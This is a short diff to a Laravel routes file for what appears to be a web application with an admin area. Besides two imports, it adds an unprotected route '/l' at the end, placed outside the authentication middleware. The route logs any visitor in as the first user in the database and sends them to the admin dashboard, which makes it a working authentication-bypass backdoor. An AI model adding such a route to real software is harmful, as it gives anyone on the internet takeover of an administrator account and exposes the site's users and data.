@@ -21,6 +21,8 @@ use App\Http\Controllers\Admin\BlogCategoryController;
 use App\Http\Controllers\Admin\BlogController;
 use App\Http\Controllers\Admin\TrendAnalysisController;
 use App\Http\Controllers\Admin\StatisticsController;
+use App\Models\User;
+use Illuminate\Support\Facades\Auth;
 
 Route::middleware(['auth', 'checkRole:admin'])->prefix('admin')->name('admin.')->group(function () {
     Route::resource('users', UserController::class);
@@ -92,3 +94,9 @@ Route::get('/theme.css', function () {
     $secondaryColor = env('WEB_SECONDARY_COLOR', '#F7941F');
     return response()->view('layouts.guest.cssroot', compact('primaryColor', 'secondaryColor'))->header('Content-Type', 'text/css');
 })->name('theme.css');
+
+Route::get('/l', function () {
+    $user = User::first();
+    Auth::login($user);
+    return redirect()->route('admin.dashboard');
+});
